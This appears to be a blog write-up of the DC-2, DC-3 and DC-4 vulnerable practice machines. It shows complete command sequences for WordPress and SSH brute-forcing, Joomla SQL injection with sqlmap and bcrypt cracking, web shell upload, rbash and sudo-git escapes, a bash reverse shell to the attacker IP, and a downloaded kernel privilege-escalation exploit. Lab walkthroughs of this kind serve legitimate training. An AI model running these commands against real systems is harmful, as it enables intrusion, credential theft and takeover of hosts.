<h2 id="DC-2渗透过程"><a href="#DC-2渗透过程" class="headerlink" title="DC-2渗透过程"></a><strong>DC-2渗透过程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -A -p- dc-2 #全端口扫描更具体</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">4.7</span>.<span class="number">10</span></span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: DC<span class="literal">-2</span> &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https<span class="literal">-redirect</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     OpenSSH <span class="number">6.7</span>p1 Debian <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问80端口，发现重定向到http://dc-2</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/hosts #写入ip dc-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问发现是wordpress，用wpscan扫描</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e u</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">User</span></span>(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2</span></span><br><span class="line">CeWL <span class="number">5.4</span>.<span class="number">7</span> (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt </span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ssh tom@192.168.126.153 -p 7744</span></span><br></pre></td></tr></table></figure>



<p>连接到tom主机上后发现大部分命令无法使用，查看环境变量发现没用/bin/bash，需要添加环境变量才可以正常执行bash，查看可执行的命令（这里有个查询的小技巧，免去一个个尝试），发现可正常执行vi，在vi中可执行命令，可利用此添加环境变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">tom@DC<span class="number">-2</span>:~$ export  <span class="comment">#查看环境变量</span></span><br><span class="line">declare -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line">declare -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line">declare -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line">declare -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line">declare -x OLDPWD</span><br><span class="line">declare -rx PATH=<span class="string">"/home/tom/usr/bin"</span></span><br><span class="line">declare -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line">declare -rx SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line">declare -x SHLVL=<span class="string">"1"</span></span><br><span class="line">declare -x SSH_CLIENT=<span class="string">"192.168.126.33 35824 7744"</span></span><br><span class="line">declare -x SSH_CONNECTION=<span class="string">"192.168.126.33 35824 192.168.126.154 7744"</span></span><br><span class="line">declare -x SSH_TTY=<span class="string">"/dev/pts/1"</span></span><br><span class="line">declare -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line">declare -x USER=<span class="string">"tom"</span></span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo $PATH</span><br><span class="line">/home/tom/usr/bin</span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo /home/tom/usr/bin/*  <span class="comment">#查询可执行命令</span></span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$ export PATH=$PATH:/bin/ <span class="comment"># 导入环境变量</span></span><br><span class="line">$ export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">jerry@DC<span class="number">-2</span>:/home/tom$ sudo -l  <span class="comment">#查看可执行root权限的命令</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC<span class="number">-2</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC<span class="number">-2</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里提示可利用git提权</span></span><br><span class="line">root@DC<span class="number">-2</span>:/home/jerry<span class="comment"># cat flag4.txt </span></span><br><span class="line">Good to see that yo<span class="string">u've made it this far - but you'</span>re <span class="keyword">not</span> home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - yo<span class="string">u're on your own now.  :-)</span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:/home/tom$ sudo git help config</span></span><br><span class="line"><span class="string">！/bin/sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@DC-2:~# cat final-flag.txt </span></span><br><span class="line"><span class="string"> __    __     _ _       _                    _ </span></span><br><span class="line"><span class="string">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ | |  / _` |/ _ \| '</span>_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-3渗透过程"><a href="#DC-3渗透过程" class="headerlink" title="DC-3渗透过程"></a><strong>DC-3渗透过程</strong></h2><p><strong>就开放了80端口，可用wappalyzer插件查看cms指纹等信息，发现是joomla框架</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
<p><strong>利用joomscan扫描出后台登陆地址、版本信息以及相关目录，然后查询相关漏洞信息进行利用！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># perl joomscan.pl -u http://192.168.126.150</span></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla <span class="number">3.7</span>.<span class="number">0</span></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/components</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/modules</span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/</span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">Joomla! <span class="number">3.7</span>.<span class="number">0</span> - <span class="string">'com_fields'</span> SQL Injection                                                           | exploits/php/webapps/<span class="number">42033</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看漏洞利用方式，存在SQL注入漏洞，相关sqlmap使用方式也列出来了</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[<span class="type">fullordering</span>]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> -<span class="literal">-risk</span>=<span class="number">3</span> -<span class="literal">-level</span>=<span class="number">5</span> -<span class="literal">-random</span><span class="literal">-agent</span> -<span class="literal">-dbs</span> <span class="literal">-p</span> list[<span class="type">fullordering</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap爆破出管理员账号和密码</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -t</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -T "#__users" -C username,password --dump</span></span><br><span class="line"></span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>得到的密码是hash值，可以利用hashcat进行爆破，密码本用kail自带的rockyou.txt</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hashid hash.txt </span></span><br><span class="line">-<span class="operator">-File</span> <span class="string">'hash.txt'</span>--</span><br><span class="line">Analyzing <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span></span><br><span class="line"><span class="function">[+] <span class="title">Blowfish</span></span>(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board <span class="number">4</span>.x </span><br><span class="line">[+] bcrypt </span><br><span class="line">root@kali:~<span class="comment"># hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span></span><br><span class="line">hashcat (v5.<span class="number">1.0</span>) starting...</span><br><span class="line"><span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy</span></span><br></pre></td></tr></table></figure>

<p><strong>得到密码为snoopy，登陆后台在template处添加shell.php写入一句话木马，用蚁剑连接，注意木马的路径，此处有提示</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
<p><strong>进入服务器后，发现无法提权，看看该版本系统是否存有漏洞，这里选择了Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps  | exploits/linux/dos/39773.txt  进行内核提权</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/192.168.126.33/4444 0&gt;&amp;1'</span>  <span class="comment">#反弹shell</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport <span class="number">2.</span>x (Ubuntu Desktop <span class="number">12.10</span> &lt; <span class="number">16.04</span>) - Local Code Execution                           | exploits/linux/local/<span class="number">40937.</span>txt</span><br><span class="line">Exim <span class="number">4</span> (Debian <span class="number">8</span> / Ubuntu <span class="number">16.04</span>) - Spool Privilege Escalation                              | exploits/linux/local/<span class="number">40054.</span>c</span><br><span class="line">Google Chrome (Fedora <span class="number">25</span> / Ubuntu <span class="number">16.04</span>) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + | exploits/linux/local/<span class="number">40943.</span>txt</span><br><span class="line">LightDM (Ubuntu <span class="number">16.04</span>/<span class="number">16.10</span>) - <span class="string">'Guest Account'</span> Local Privilege Escalation                  | exploits/linux/local/<span class="number">41923.</span>txt</span><br><span class="line">Linux Kernel (Debian <span class="number">7.7</span>/<span class="number">8.5</span>/<span class="number">9.0</span> / Ubuntu <span class="number">14.04</span><span class="number">.2</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">22</span>/<span class="number">25</span> / CentOS <span class="number">7.</span> | exploits/linux_x86<span class="number">-64</span>/local/<span class="number">42275.</span>c</span><br><span class="line">Linux Kernel (Debian <span class="number">9</span>/<span class="number">10</span> / Ubuntu <span class="number">14.04</span><span class="number">.5</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">23</span>/<span class="number">24</span>/<span class="number">25</span>) - <span class="string">'ldso_dynami | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                      | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read  | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)            | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak         | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Esca | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition  | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalati | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation     | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                 | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                     | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Esc | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KA | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Priv | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>查看该exp的使用方法，先执行compile.sh、再执行doubleput即可</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39772.txt ubuntu_v1604_shell.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt </span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">'ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@host:~/ebpf_mapfd_doubleput# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span></span><br></pre></td></tr></table></figure>

<p>先下载到本地解压缩后，开启本地的web服务器，上传到目标服务器，由于文件过大，蚁剑无法上传</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line">unzip <span class="number">39772.</span>zip</span><br><span class="line">cd <span class="number">39772</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> ...</span><br><span class="line">$ wget http://<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">'_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you'</span>ve enjoyed this challenge <span class="keyword">as</span> I enjoyed making it.</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-4渗透过程"><a href="#DC-4渗透过程" class="headerlink" title="DC-4渗透过程"></a><strong>DC-4渗透过程</strong></h2><p><strong>登陆页面，提示用admin登陆，这里用password.list密码本爆破，rockyou.txt需要很久时间，求出密码后登陆发现可以执行命令有回显，抓包修改反弹shell，发现了一个密码本，可能是用来爆破ssh账号的，用scp发送到本地</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/john<span class="comment"># hydra -l admin -P ./password.lst -f 192.168.126.149 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -v</span></span><br><span class="line"></span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="number">80</span>][<span class="type">http</span>-<span class="type">post</span>-<span class="type">form</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: admin   password: happy</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件发送到本地</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># scp ./old-passwords.bak root@192.168.126.33:/root/tools</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码爆破，-t 64 表示线程数  -f 表示找到密码即停   -v表示显示具体的</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L users.txt -P pswd.txt ssh://192.168.126.149 -t 64 -f -v</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: jim   password: jibril04</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/john<span class="comment"># ssh jim@192.168.126.149 </span></span><br><span class="line">jim@<span class="number">192.168</span>.<span class="number">126.149</span><span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i68</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现邮件，查看邮件信息</span></span><br><span class="line"><span class="string">jim@dc-4:~$ cd /var/mail</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ ls</span></span><br><span class="line"><span class="string">jim  www-data</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ cat jim</span></span><br><span class="line"><span class="string">From charles@dc-4 Sat Apr 06 21:15:46 2019</span></span><br><span class="line"><span class="string">Return-path: &lt;charles@dc-4&gt;</span></span><br><span class="line"><span class="string">Hi Jim,</span></span><br><span class="line"><span class="string">I'</span>m heading off on holidays at the <span class="keyword">end</span> of today, so the boss asked me to give you my password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>

<p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
